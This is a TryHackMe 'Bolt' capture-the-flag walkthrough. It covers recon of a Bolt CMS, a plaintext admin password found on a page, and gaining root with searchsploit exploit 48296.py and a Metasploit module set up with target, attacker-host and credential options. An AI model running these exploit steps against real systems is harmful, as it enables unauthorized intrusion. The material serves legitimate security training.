TryHackMe <br>
Bolt
---

Nmap scan shows us three open ports. <br> 
Port 80 is just the apache server page, however, port 8000 is the CMS (*content management system*). <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/7da68b54-f14c-44d3-b7cb-fd2f4dc381d5)

Gobuster scan on the webpage on port 8000: <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/9ef1850c-a13c-4192-99f7-9df65d0840e5) 

On the bottom of the page there are some interesting links that I need to check out. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/6ed3b063-220a-4ec3-99d2-e08b96d498c9)

The *Message From Admin* is the same note on the main page. <br>
The *Message for IT Department* link shows another note from the admin with his password in plaintext! <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/4ee41e75-2b81-45ff-9398-b3ecff567c7a)

I also decided to check the source code for anything extra and from there I found the version number. <br>
![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/84250b57-cc89-4b5b-9241-f9d2f35cb78f)

Now that I have the version number and name of the service it’s time to check `searchsploit`. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/25d63b5f-8bb9-4b93-b3f6-75bc990623eb)

The way I originally chose to exploit this was on my machine first, then I used `Metasploit` (per the room instructions). <br>

```
$ searchsploit -m php/webapps/48296.py
# mirrors/downloads the script to my machine

$ python3 ./48296.py http://<target_IP>:8000 <username> <password>
# command to run the script
```

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/2790ff36-d2d9-4103-9e87-741505afcc54)

Now that I have root access time to check for the flag. <br>

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/0a9f3e30-b916-4122-b030-4a0b0d7daf2b)

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/7211df03-ff15-4b5a-a0e3-9e0b2cc2cc87)


To be able to do this in Metasploit: <br>

```
$ search bolt 3.7
# searches the metasploit DB for exploits relating to the search parameters
```

![image](https://github.com/xocybersec/TryHackMe-Walkthroughs/assets/91302698/7b783b7d-26ef-4ce9-9993-4f8a168d3f14)

```
$ use 0
# this selects the module to use, since this is numbered “0” that’s what I typed

$ show options
# shows the parameters that are used and what needs to be changed.

$ set RHOSTS <target_IP>
$ set LHOST <attack_machine_IP>
$ set USERNAME <username>
# enter the username to be used
$ set PASSWORD <password>
# enter the password to be used

$ run
# executes the exploit with the given parameters
```
From there you can use the `find` command again to locate the file.




